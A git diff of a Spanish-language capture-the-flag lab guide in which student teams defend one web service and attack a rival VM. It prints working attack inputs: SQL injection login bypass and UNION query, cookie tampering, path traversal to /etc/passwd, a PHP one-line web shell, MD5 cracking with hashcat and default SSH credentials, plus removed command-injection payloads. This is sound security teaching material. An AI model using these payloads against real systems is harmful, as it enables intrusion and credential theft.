@@ -11,7 +11,7 @@
 |-------------------------|------|-----------------------------------------------|-------------------------------------------|
 | **TU equipo (IDS)**     | VM1  | IDS — `http://<IP-VM1>:8080`                  | `ssh admin@<IP-VM1> -p 2222` (`password123`) |
 | Rival (Equipo UWS)      | VM2  | UWS — `http://<IP-VM2>:8081`                  | `ssh admin@<IP-VM2> -p 2223` (`password123`) |
-| Scoreboard (compartido) | VM3  | `http://<IP-SCOREBOARD>:9000`                 | —                                         |
+| Scoreboard (compartido) | LXC  | `http://<IP-LXC>:9000`                         | —                                         |
 
 > Pediles las IPs al instructor. La variable `SCOREBOARD_URL` ya quedo configurada en tu VM
 > al momento del despliegue, asi que el dashboard de IDS muestra un banner con el link directo.
@@ -23,7 +23,7 @@
 Ganan puntos quienes cumplan **simultaneamente** estos tres objetivos:
 
 1. **Tu servicio IDS (`http://<IP-VM1>:8080`) debe seguir respondiendo** durante toda la duracion del ejercicio. El instructor lo verifica con health checks periodicos (HTTP 200 sobre `/`).
-2. **Conseguir banderas del rival** (todas con prefijo `FLAG{UCC_UWS_*}`) y/o **acumular mas puntos** que el rival al cierre.
+2. **Conseguir banderas del rival** (valor aleatorio `FLAG{...}`, registrado en el scoreboard) y/o **acumular mas puntos** que el rival al cierre.
 3. **Si IDS queda caido o eliminado por mas de 10 minutos consecutivos**, **pierden por knock-out**: el rival gana automaticamente sin importar el marcador.
 
 ### Objetivos adicionales sugeridos (sumar/restar puntos)
@@ -31,7 +31,7 @@ Ganan puntos quienes cumplan **simultaneamente** estos tres objetivos:
 | Concepto                                           | Efecto                |
 |----------------------------------------------------|-----------------------|
 | Cada bandera real del rival enviada al scoreboard  | Suma segun valor (50 a 150) |
-| Bandera honeypot enviada (`FLAG{HONEYPOT_*}` / `FLAG{FAKE_*}`) | **-50 pts** |
+| Bandera honeypot enviada (mismo formato que una real) | **-50 pts** |
 | Reportar al instructor un honeypot **sin enviarlo** | **+25 pts** (gesto de inteligencia, no codicia) |
 | Mantener el servicio sin downtime las 3 horas      | **+100 pts** al cierre |
 | Cada ventana de 5 min consecutivos de downtime     | **-25 pts**           |
@@ -58,7 +58,8 @@ Asumiendo que el instructor te dio acceso a la VM1 con Docker instalado:
 
 ```bash
 cd ~/ctf1                                          # carpeta del proyecto en la VM
-export SCOREBOARD_URL="http://<IP-SCOREBOARD>:9000"
+export SCOREBOARD_URL="http://<IP-LXC>:9000"
+export LAB_SYNC_TOKEN="<token que entrega el instructor>"
 docker compose up -d --build
 docker compose ps                                  # ambos containers UP
 curl -sI http://localhost:8080 | head -n 1         # debe responder 200
@@ -137,18 +138,18 @@ echo '<input type="hidden" name="csrf" value="'.$_SESSION['csrf'].'">';
 ## 6. Tu menu ofensivo (atacar al rival UWS)
 
 El rival corre **el mismo set de vulnerabilidades** sobre `http://<IP-VM2>:8081`.
-Las banderas del rival tienen prefijo `FLAG{UCC_UWS_*}`.
+Las banderas del rival son aleatorias. El formato es `FLAG{345_gonasf_32v}` y el scoreboard es quien las registra al iniciar la partida.
 
-| # | Vector              | URL en el rival                                | Bandera (a enviar al scoreboard)              | Pts |
-|---|---------------------|------------------------------------------------|------------------------------------------------|-----|
-| 1 | SQL Injection       | `http://<IP-VM2>:8081/index.php`               | `FLAG{UCC_UWS_SQLi_Bypass}`                    | 50  |
-| 2 | Cookie tamper       | `http://<IP-VM2>:8081/admin.php` con `role=admin` | `FLAG{UCC_UWS_Cookie_Bypass}`               | 75  |
-| 3 | LFI                 | `/download.php?file=admin_notes.md`            | `FLAG{UCC_UWS_LFI_Found}`                      | 60  |
-| 4 | Config leak via LFI | `/download.php?file=../config/app.ini`         | `FLAG{UCC_UWS_Config_Leaked}`                  | 70  |
-| 5 | Command Injection   | `/network.php` (host `db_ssh; cat /etc/passwd`)| `FLAG{UCC_UWS_Cmd_Inject}`                     | 80  |
-| 6 | Upload RCE          | `/upload.php` subiendo `shell.php`             | `FLAG{UCC_UWS_Upload_RCE}`                     | 120 |
-| 7 | Hash cracking       | tabla `secrets` (via SQLi UNION)               | `FLAG{UCC_UWS_Hash_Cracked}`                   | 100 |
-| 8 | SSH pivot           | `ssh admin@<IP-VM2> -p 2223`                   | `FLAG{UCC_UWS_Pwned}`                          | 150 |
+| # | Vector              | Donde aparece                                      | Bandera                         | Pts |
+|---|---------------------|----------------------------------------------------|---------------------------------|-----|
+| 1 | SQL Injection       | fila `secrets` del rival                           | aleatoria                       | 50  |
+| 2 | Cookie tamper       | panel `/admin.php`                                 | aleatoria                       | 75  |
+| 3 | LFI                 | `admin_notes.md`                                   | aleatoria                       | 60  |
+| 4 | Config leak via LFI | `config/app.ini`                                   | aleatoria                       | 70  |
+| 5 | Command Injection   | nota interna que lista `/network.php`              | aleatoria                       | 80  |
+| 6 | Upload RCE          | nota interna que lista `/upload.php`               | aleatoria                       | 120 |
+| 7 | Hash cracking       | fila `secrets` tras descifrar los MD5              | aleatoria                       | 100 |
+| 8 | SSH pivot           | `/home/admin/flag.txt`                             | aleatoria                       | 150 |
 
 ### Quick wins (5 sub-grupos de 3 personas)
 
@@ -157,7 +158,7 @@ Las banderas del rival tienen prefijo `FLAG{UCC_UWS_*}`.
 usuario: ' OR '1'='1' --
 password: cualquiera
 ```
-Login OK -> bandera SQLi. Despues abrir DevTools -> Application -> Cookies -> agregar
+Login OK. La bandera de SQL queda en la tabla `secrets`. Despues abrir DevTools -> Application -> Cookies -> agregar
 `role=admin` y visitar `/admin.php` -> bandera cookie.
 
 **SubGrupo B — LFI:**
@@ -166,8 +167,7 @@ Login OK -> bandera SQLi. Despues abrir DevTools -> Application -> Cookies -> ag
 - Bonus: `?file=../../../../../etc/passwd`
 
 **SubGrupo C — Command Injection:**
-- En `/network.php` poner host: `db_ssh; cat /var/www/html/config/app.ini`
-- Para encontrar la flag: `localhost; find / -name "FLAG*" 2>/dev/null`
+- La pagina `/network.php` lista la nota interna de ese vector.
 
 **SubGrupo D — Upload RCE:**
 1. Crear `shell.php` localmente:
@@ -175,12 +175,12 @@ Login OK -> bandera SQLi. Despues abrir DevTools -> Application -> Cookies -> ag
    <?php system($_GET['c']); ?>
    ```
 2. Subirlo via `/upload.php`.
-3. Ejecutar: `http://<IP-VM2>:8081/uploads/shell.php?c=cat+/var/www/html/config/app.ini`.
+3. La pagina `/upload.php` lista la nota interna de ese vector.
 
 **SubGrupo E — Hash + SSH:**
 1. SQLi UNION: `' UNION SELECT 1,label,value FROM secrets -- `
 2. Copiar los 3 hashes MD5 -> `hashcat -m 0 hashes.txt rockyou.txt`
-3. Reportar `FLAG{UCC_UWS_Hash_Cracked}`.
+3. Enviar al scoreboard la bandera aleatoria de ese vector.
 4. Con `admin/password123` -> `ssh admin@<IP-VM2> -p 2223` -> `cat /home/admin/flag.txt`.
 
 > **Roadmap rapido del rival:** `http://<IP-VM2>:8081/robots.txt` lista todos los endpoints "ocultos".
@@ -189,13 +189,13 @@ Login OK -> bandera SQLi. Despues abrir DevTools -> Application -> Cookies -> ag
 
 ## 7. Honeypots y scoreboard
 
-- En la DB del rival hay **al menos una bandera trampa** (`FLAG{HONEYPOT_*}` o `FLAG{FAKE_*}`).
+- En la DB del rival hay **al menos una bandera trampa** con el mismo formato que una real.
   **NO la envien al scoreboard**: resta 50 pts. Si la encuentran y la reportan al instructor,
   ganan 25 pts de inteligencia.
 - Cada bandera real cuenta **una sola vez** por equipo (la primera entrega es la valida).
 - El scoreboard pide **alias** y **equipo** (`ids` / `uws`). Pongan siempre `ids`.
 
-URL: `http://<IP-SCOREBOARD>:9000` (tambien linkeado desde el banner del dashboard de IDS).
+URL: `http://<IP-LXC>:9000` (tambien linkeado desde el banner del dashboard de IDS). Si el ejercicio no inició, está detenido o fue reiniciado, la estación muestra esa pantalla antes que la aplicación.
 
 ---
 
